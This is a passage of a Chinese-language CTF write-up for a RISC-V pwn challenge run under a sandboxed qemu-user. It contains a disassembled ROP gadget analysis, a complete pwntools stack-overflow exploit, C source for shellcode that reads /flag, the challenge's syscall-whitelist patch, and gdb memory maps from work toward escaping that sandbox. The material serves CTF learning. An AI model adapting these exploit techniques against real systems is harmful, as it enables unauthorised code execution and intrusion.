class="line">00011782 63 0e 09 00     beq        s2,zero,LAB_0001179e</span><br><span class="line">00011786 13 04 84 b8     addi       s0,s0,-0x478</span><br><span class="line">0001178a 81 44           c.li       s1,0x0</span><br><span class="line">                     LAB_0001178c                                    XREF[1]:     0001179a(j)  </span><br><span class="line">0001178c 1c 60           c.ld       a5&#x3D;&gt;-&gt;FUN_00010284,0x0(s0&#x3D;&gt;-&gt;FUN_00010250)       &#x3D; 00010284</span><br><span class="line">                                                                                     &#x3D; 00010250</span><br><span class="line">0001178e 56 86           c.mv       a2,s5</span><br><span class="line">00011790 d2 85           c.mv       a1,s4</span><br><span class="line">00011792 4e 85           c.mv       a0,s3</span><br><span class="line">00011794 85 04           c.addi     s1,0x1</span><br><span class="line">00011796 82 97           c.jalr     a5&#x3D;&gt;FUN_00010284                                 undefined FUN_00010250()</span><br><span class="line">                                                                                     undefined FUN_00010284()</span><br><span class="line">00011798 21 04           c.addi     s0,0x8</span><br><span class="line">0001179a e3 19 99 fe     bne        s2,s1,LAB_0001178c</span><br><span class="line">                     LAB_0001179e                                    XREF[1]:     00011782(j)  </span><br><span class="line">0001179e e2 70           c.ldsp     ra,0x38(sp)</span><br><span class="line">000117a0 42 74           c.ldsp     s0,0x30(sp)</span><br><span class="line">000117a2 a2 74           c.ldsp     s1,0x28(sp)</span><br><span class="line">000117a4 02 79           c.ldsp     s2,0x20(sp)</span><br><span class="line">000117a6 e2 69           c.ldsp     s3,0x18(sp)</span><br><span class="line">000117a8 42 6a           c.ldsp     s4,0x10(sp)</span><br><span class="line">000117aa a2 6a           c.ldsp     s5,0x8(sp)</span><br><span class="line">000117ac 21 61           c.addi16sp sp,0x40</span><br><span class="line">000117ae 82 80           ret</span><br></pre></td></tr></table></figure>

<p>具体利用过程如下:</p>
<ol>
<li>覆盖栈上的返回地址为  0x0001179e</li>
<li>执行 0x0001179e 到 0x000117ae 之间的代码时通过栈上的值控制以下寄存器<ol>
<li>ra = 0x00011772</li>
<li>s0 = gets + 0x478</li>
<li>s2 = gets + 0x470</li>
</ol>
</li>
<li>ret 到 0x00011772 继续执行:<ol>
<li>a5 = gets</li>
<li>0x00011782 处判断因为 s0 和 s5 相等, 所以跳到 0x0001179e 处继续执行</li>
</ol>
</li>
<li>执行 0x0001179e 到 0x000117ae 之间的代码时通过栈上的值控制以下寄存器<ol>
<li>ra = 0x0001178e</li>
<li>s3 = bss_addr</li>
<li>s1 = 0</li>
<li>s2 = 1</li>
</ol>
</li>
<li>ret 到 0x0001178e 继续执行<ol>
<li>a0 = s3 = bss_addr</li>
<li>jal a5 # 执行 gets(bss_addr) 可以把orw shellcode读进去.</li>
<li>s1 = s1 + 1  -&gt; s1 = 1 = s2</li>
<li>0x0001179a 分支指令因为 s1 和 s2 相等跳到 0x0001179e 处继续执行</li>
</ol>
</li>
<li>等价于回到第一步, 只要栈上我们可以控制的内存足够大, 就可以进行任意次 rop<ol>
<li>此时我们可以跳动 bss_addr 执行已经读入的 shellcode.</li>
</ol>
</li>
</ol>
<p>完整的 exp 如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> pwn_framework <span class="keyword">as</span> pf</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> io</span><br><span class="line">ru = <span class="keyword">lambda</span> p, x        : p.recvuntil(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> p, x        : p.send(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> p           : p.recvline()</span><br><span class="line">sl = <span class="keyword">lambda</span> p, x        : p.sendline(x)</span><br><span class="line">rv = <span class="keyword">lambda</span> p, x=<span class="number">1024</span>   : p.recv(numb = x)</span><br><span class="line">sa = <span class="keyword">lambda</span> p, a, b     : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> p, a, b    : p.sendlineafter(a,b)</span><br><span class="line">rr = <span class="keyword">lambda</span> p, t        : p.recvrepeat(t)</span><br><span class="line">rd = <span class="keyword">lambda</span> p, x        : p.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">context(bits = <span class="number">64</span>, os = <span class="string">&#x27;linux&#x27;</span>, endian = <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;./main&quot;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">io = process([<span class="string">&quot;./qemu-riscv64&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>, <span class="string">&quot;main&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lg</span>(<span class="params">name, val</span>):</span></span><br><span class="line">    log.info(name+<span class="string">&quot; : &quot;</span>+<span class="built_in">hex</span>(val))</span><br><span class="line"></span><br><span class="line">gets_addr = <span class="number">0x00016a5a</span></span><br><span class="line">bss = <span class="number">0x00000000006f000</span></span><br><span class="line">gad1 = <span class="number">0x0001179e</span></span><br><span class="line">gad2 = <span class="number">0x00011772</span></span><br><span class="line">gad3 = <span class="number">0x0001178e</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        00011772 93 07 84 b8     addi       a5,s0,-0x478</span></span><br><span class="line"><span class="string">        00011776 13 09 09 b9     addi       s2,s2,-0x470</span></span><br><span class="line"><span class="string">        0001177a 33 09 f9 40     sub        s2,s2,a5</span></span><br><span class="line"><span class="string">        0001177e 13 59 39 40     srai       s2,s2,0x3</span></span><br><span class="line"><span class="string">        00011782 63 0e 09 00     beq        s2,zero,LAB_0001179e</span></span><br><span class="line"><span class="string">        00011786 13 04 84 b8     addi       s0,s0,-0x478</span></span><br><span class="line"><span class="string">        0001178a 81 44           c.li       s1,0x0</span></span><br><span class="line"><span class="string">                             LAB_0001178c                                    XREF[1]:     0001179a(j)  </span></span><br><span class="line"><span class="string">        0001178c 1c 60           c.ld       a5=&gt;-&gt;FUN_00010284,0x0(s0=&gt;-&gt;FUN_00010250)       = 00010284</span></span><br><span class="line"><span class="string">                                                                                             = 00010250</span></span><br><span class="line"><span class="string">        0001178e 56 86           c.mv       a2,s5</span></span><br><span class="line"><span class="string">        00011790 d2 85           c.mv       a1,s4</span></span><br><span class="line"><span class="string">        00011792 4e 85           c.mv       a0,s3</span></span><br><span class="line"><span class="string">        00011794 85 04           c.addi     s1,0x1</span></span><br><span class="line"><span class="string">        00011796 82 97           c.jalr     a5=&gt;FUN_00010284                                 undefined FUN_00010250()</span></span><br><span class="line"><span class="string">                                                                                             undefined FUN_00010284()</span></span><br><span class="line"><span class="string">        00011798 21 04           c.addi     s0,0x8</span></span><br><span class="line"><span class="string">        0001179a e3 19 99 fe     bne        s2,s1,LAB_0001178c</span></span><br><span class="line"><span class="string">                             LAB_0001179e                                    XREF[1]:     00011782(j)  </span></span><br><span class="line"><span class="string">        0001179e e2 70           c.ldsp     ra,0x38(sp)</span></span><br><span class="line"><span class="string">        000117a0 42 74           c.ldsp     s0,0x30(sp)</span></span><br><span class="line"><span class="string">        000117a2 a2 74           c.ldsp     s1,0x28(sp)</span></span><br><span class="line"><span class="string">        000117a4 02 79           c.ldsp     s2,0x20(sp)</span></span><br><span class="line"><span class="string">        000117a6 e2 69           c.ldsp     s3,0x18(sp)</span></span><br><span class="line"><span class="string">        000117a8 42 6a           c.ldsp     s4,0x10(sp)</span></span><br><span class="line"><span class="string">        000117aa a2 6a           c.ldsp     s5,0x8(sp)</span></span><br><span class="line"><span class="string">        000117ac 21 61           c.addi16sp sp,0x40</span></span><br><span class="line"><span class="string">        000117ae 82 80           ret</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_rop_chain</span>(<span class="params">target, a0=<span class="number">0</span>, a1=<span class="number">0</span>, a2=<span class="number">0</span></span>):</span></span><br><span class="line">    payload = flat(&#123;</span><br><span class="line">        <span class="number">0x40</span> * <span class="number">0</span> + <span class="number">0x38</span>: gad2, <span class="comment"># jmp to gad2</span></span><br><span class="line">        <span class="number">0x40</span> * <span class="number">0</span> + <span class="number">0x30</span>: target + <span class="number">0x478</span>, <span class="comment"># set s0, a5 = s0 - 0x478</span></span><br><span class="line">        <span class="number">0x40</span> * <span class="number">0</span> + <span class="number">0x20</span>: target + <span class="number">0x470</span>, <span class="comment"># set s2</span></span><br><span class="line"></span><br><span class="line">        <span class="number">0x40</span> * <span class="number">1</span> + <span class="number">0x38</span>: gad3, <span class="comment"># jmp to gad3</span></span><br><span class="line">        <span class="number">0x40</span> * <span class="number">1</span> + <span class="number">0x18</span>: a0, <span class="comment"># set s3, a0 = s3</span></span><br><span class="line">        <span class="number">0x40</span> * <span class="number">1</span> + <span class="number">0x10</span>: a1, <span class="comment"># set s4, a1 = s4</span></span><br><span class="line">        <span class="number">0x40</span> * <span class="number">1</span> + <span class="number">0x08</span>: a2, <span class="comment"># set s5, a2 = s5</span></span><br><span class="line">        <span class="number">0x40</span> * <span class="number">1</span> + <span class="number">0x28</span>: <span class="number">0</span>, <span class="comment"># s1</span></span><br><span class="line">        <span class="number">0x40</span> * <span class="number">1</span> + <span class="number">0x20</span>: <span class="number">1</span>, <span class="comment"># s2</span></span><br><span class="line">    &#125;, length=<span class="number">0x80</span>, filler=<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">p1 = flat(</span><br><span class="line">    <span class="comment"># b&quot;flag&#123;have_you_tried_ghidra9.2_decompiler_@if_you_have_hexriscv_plz_share_it_with_me_thx:P&#125;&quot;.ljust(0x118, &#x27;\x00&#x27;),</span></span><br><span class="line">    <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x118</span>,</span><br><span class="line">    <span class="number">0xdeadbeef</span>, <span class="comment"># S0</span></span><br><span class="line">    gad1, <span class="comment"># ra</span></span><br><span class="line">    gen_rop_chain(gets_addr, bss),</span><br><span class="line">    gen_rop_chain(bss)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">sla(io, <span class="string">&quot;flag&quot;</span>, p1)</span><br><span class="line"></span><br><span class="line">sc = <span class="built_in">open</span>(<span class="string">&quot;./sc.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"></span><br><span class="line">sla(io, <span class="string">&quot;wrong&quot;</span>, sc)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>sc.bin 由如下代码生成:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/uio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> flag_path[] = <span class="string">&quot;/flag&quot;</span>;</span><br><span class="line"><span class="comment">// __attribute__((section(&quot;.text#&quot;))) static char flag_path[] = &quot;/flag&quot;;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">syscall</span><span class="params">(<span class="keyword">uint64_t</span> nr, ...)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> _start()&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x400</span>];</span><br><span class="line">    <span class="keyword">int</span> fd = syscall(__NR_openat, AT_FDCWD, flag_path, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    syscall(__NR_read, fd, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    syscall(__NR_write, <span class="number">1</span>, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">asm</span>(</span><br><span class="line">    <span class="string">&quot;syscall:\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mv a7, a0\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mv a0, a1\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mv a1, a2\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mv a2, a3\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mv a3, a4\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mv a4, a5\n&quot;</span></span><br><span class="line">        <span class="string">&quot;mv a5, a6\n&quot;</span></span><br><span class="line">        <span class="string">&quot;ecall\n&quot;</span></span><br><span class="line">        <span class="string">&quot;ret\n&quot;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">riscv64-linux-gnu-gcc-10 -Wa,-R -fPIC -O0 -nostdlib sc.c -o sc</span></span><br><span class="line"><span class="comment">riscv64-linux-gnu-objcopy -S -O binary -j .text ./sc ./sc.bin</span></span><br><span class="line"><span class="comment">riscv64-linux-gnu-objdump -d ./sc | less</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>关于使用 c 代码生成 shellcode 的更多详情可以参考我的另一篇文章: <a href="https://pullp.github.io/2021/01/30/shellcode-tips/">https://pullp.github.io/2021/01/30/shellcode-tips/</a></p>
<h3 id="third-flag-getshell"><a href="#third-flag-getshell" class="headerlink" title="third flag-getshell"></a>third flag-getshell</h3><p>第三个 flag 需要执行服务器上的一个程序 <code>readflag</code> 才可以拿到, 所以需要 getshell, 但是这个 qemu-user 是被 patch 过的, 附件中有patch 文件:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">diff --git a&#x2F;linux-user&#x2F;syscall.c b&#x2F;linux-user&#x2F;syscall.c</span><br><span class="line">index 27adee9..2d75464 100644</span><br><span class="line">--- a&#x2F;linux-user&#x2F;syscall.c</span><br><span class="line">+++ b&#x2F;linux-user&#x2F;syscall.c</span><br><span class="line">@@ -13101,8 +13101,31 @@ abi_long do_syscall(void *cpu_env, int num, abi_long arg1,</span><br><span class="line">         print_syscall(cpu_env, num, arg1, arg2, arg3, arg4, arg5, arg6);</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line">-    ret &#x3D; do_syscall1(cpu_env, num, arg1, arg2, arg3, arg4,</span><br><span class="line">-                      arg5, arg6, arg7, arg8);</span><br><span class="line">+    switch (num) &#123;</span><br><span class="line">+        &#x2F;&#x2F; syscall whitelist</span><br><span class="line">+        case TARGET_NR_brk:</span><br><span class="line">+        case TARGET_NR_uname:</span><br><span class="line">+        case TARGET_NR_readlinkat:</span><br><span class="line">+        case TARGET_NR_faccessat:</span><br><span class="line">+        case TARGET_NR_openat2:</span><br><span class="line">+        case TARGET_NR_openat:</span><br><span class="line">+        case TARGET_NR_read:</span><br><span class="line">+        case TARGET_NR_readv:</span><br><span class="line">+        case TARGET_NR_write:</span><br><span class="line">+        case TARGET_NR_writev:</span><br><span class="line">+        case TARGET_NR_mmap:</span><br><span class="line">+        case TARGET_NR_munmap:</span><br><span class="line">+        case TARGET_NR_exit:</span><br><span class="line">+        case TARGET_NR_exit_group:</span><br><span class="line">+        case TARGET_NR_mprotect:</span><br><span class="line">+            ret &#x3D; do_syscall1(cpu_env, num, arg1, arg2, arg3, arg4,</span><br><span class="line">+                    arg5, arg6, arg7, arg8);</span><br><span class="line">+            break;</span><br><span class="line">+        default:</span><br><span class="line">+            printf(&quot;[!] %d bad system call\n&quot;, num);</span><br><span class="line">+            ret &#x3D; -1;</span><br><span class="line">+            break;</span><br><span class="line">+    &#125;</span><br><span class="line"> </span><br><span class="line">     if (unlikely(qemu_loglevel_mask(LOG_STRACE))) &#123;</span><br><span class="line">         print_syscall_ret(cpu_env, num, ret, arg1, arg2,</span><br></pre></td></tr></table></figure>

<p>从 patch 文件中我们可以发现 qemu-user 有个 syscall 沙箱, 只能使用部分 syscall, 关键的 execve 我们是无法使用的. 不过 qemu usermode 下 guest 程序和qemu 本体其实是出于同一个进程空间的, 通过对 qemu 调试我们可以发现:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line">$ gdb -q ./qemu-riscv64</span><br><span class="line">...</span><br><span class="line">gef&gt; run ./main</span><br><span class="line">...</span><br><span class="line">gef&gt; vmmap</span><br><span class="line">[ Legend:  Code | Heap | Stack ]</span><br><span class="line">Start              End                Offset             Perm Path</span><br><span class="line">0x0000000000010000 0x000000000006c000 0x0000000000000000 r-- /mnt/hgfs/ctf/ctf_games/2021/startctf/starctf2021-main/re&amp;pwn-favourite architecture/release/share/main</span><br><span class="line">0x000000000006c000 0x000000000006f000 0x000000000005b000 rw- /mnt/hgfs/ctf/ctf_games/2021/startctf/starctf2021-main/re&amp;pwn-favourite architecture/release/share/main</span><br><span class="line">0x000000000006f000 0x0000000000093000 0x0000000000000000 rw-</span><br><span class="line">0x0000004000000000 0x0000004000001000 0x0000000000000000 ---</span><br><span class="line">0x0000004000001000 0x0000004000801000 0x0000000000000000 rw-</span><br><span class="line">0x0000555555554000 0x00005555559bd000 0x0000000000000000 r-x /mnt/hgfs/ctf/ctf_games/2021/startctf/starctf2021-main/re&amp;pwn-favourite architecture/release/share/qemu-riscv64</span><br><span class="line">0x0000555555bbc000 0x0000555555bf8000 0x0000000000468000 r-- /mnt/hgfs/ctf/ctf_games/2021/startctf/starctf2021-main/re&amp;pwn-favourite architecture/release/share/qemu-riscv64</span><br><span class="line">0x0000555555bf8000 0x0000555555c24000 0x00000000004a4000 rw- /mnt/hgfs/ctf/ctf_games/2021/startctf/starctf2021-main/re&amp;pwn-favourite architecture/release/share/qemu-riscv64</span><br><span class="line">0x0000555555c24000 0x0000555555cea000 0x0000000000000000 rw- [heap]</span><br><span class="line">0x00007fffe8000000 0x00007fffeffff000 0x0000000000000000 rwx</span><br><span class="line">0x00007fffeffff000 0x00007ffff0000000 0x0000000000000000 ---</span><br><span class="line">0x00007ffff0000000 0x00007ffff0021000 0x0000000000000000 rw-</span><br><span class="line">0x00007ffff0021000 0x00007ffff4000000 0x0000000000000000 ---</span><br><span class="line">0x00007ffff6c3e000 0x00007ffff6cbf000 0x0000000000000000 rw-</span><br><span class="line">0x00007ffff6cbf000 0x00007ffff6cc0000 0x0000000000000000 ---</span><br><span class="line">0x00007ffff6cc0000 0x00007ffff74c5000 0x0000000000000000 rw-</span><br><span class="line">0x00007ffff74c5000 0x00007ffff74c6000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libdl-2.31.so</span><br><span class="line">0x00007ffff74c6000 0x00007ffff74c8000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/libdl-2.31.so</span><br><span class="line">0x00007ffff74c8000 0x00007ffff74c9000 0x0000000000003000 r-- /usr/lib/x86_64-linux-gnu/libdl-2.31.so</span><br><span class="line">0x00007ffff74c9000 0x00007ffff74ca000 0x0000000000003000 r-- /usr/lib/x86_64-linux-gnu/libdl-2.31.so</span><br><span class="line">0x00007ffff74ca000 0x00007ffff74cb000 0x0000000000004000 rw- /usr/lib/x86_64-linux-gnu/libdl-2.31.so</span><br><span class="line">0x00007ffff74cb000 0x00007ffff74cd000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libffi.so.7.1.0</span><br><span class="line">0x00007ffff74cd000 0x00007ffff74d3000 0x0000000000002000 r-x /usr/lib/x86_64-linux-gnu/libffi.so.7.1.0</span><br><span class="line">0x00007ffff74d3000 0x00007ffff74d4000 0x0000000000008000 r-- /usr/lib/x86_64-linux-gnu/libffi.so.7.1.0</span><br><span class="line">0x00007ffff74d4000 0x00007ffff74d5000 0x0000000000009000 --- /usr/lib/x86_64-linux-gnu/libffi.so.7.1.0</span><br><span class="line">0x00007ffff74d5000 0x00007ffff74d6000 0x0000000000009000 r-- /usr/lib/x86_64-linux-gnu/libffi.so.7.1.0</span><br><span class="line">0x00007ffff74d6000 0x00007ffff74d7000 0x000000000000a000 rw- /usr/lib/x86_64-linux-gnu/libffi.so.7.1.0</span><br><span class="line">0x00007ffff74d7000 0x00007ffff74d9000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libpcre.so.3.13.3</span><br><span class="line">0x00007ffff74d9000 0x00007ffff752a000 0x0000000000002000 r-x /usr/lib/x86_64-linux-gnu/libpcre.so.3.13.3</span><br><span class="line">0x00007ffff752a000 0x00007ffff7548000 0x0000000000053000 r-- /usr/lib/x86_64-linux-gnu/libpcre.so.3.13.3</span><br><span class="line">0x00007ffff7548000 0x00007ffff7549000 0x0000000000070000 r-- /usr/lib/x86_64-linux-gnu/libpcre.so.3.13.3</span><br><span class="line">0x00007ffff7549000 0x00007ffff754a000 0x0000000000071000 rw- /usr/lib/x86_64-linux-gnu/libpcre.so.3.13.3</span><br><span class="line">0x00007ffff754a000 0x00007ffff7554000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libgmp.so.10.4.0</span><br><span class="line">0x00007ffff7554000 0x00007ffff75b4000 0x000000000000a000 r-x /usr/lib/x86_64-linux-gnu/libgmp.so.10.4.0</span><br><span class="line">0x00007ffff75b4000 0x00007ffff75cb000 0x000000000006a000 r-- /usr/lib/x86_64-linux-gnu/libgmp.so.10.4.0</span><br><span class="line">0x00007ffff75cb000 0x00007ffff75cc000 0x0000000000081000 --- /usr/lib/x86_64-linux-gnu/libgmp.so.10.4.0</span><br><span class="line">0x00007ffff75cc000 0x00007ffff75cd000 0x0000000000081000 r-- /usr/lib/x86_64-linux-gnu/libgmp.so.10.4.0</span><br><span class="line">0x00007ffff75cd000 0x00007ffff75ce000 0x0000000000082000 rw- /usr/lib/x86_64-linux-gnu/libgmp.so.10.4.0</span><br><span 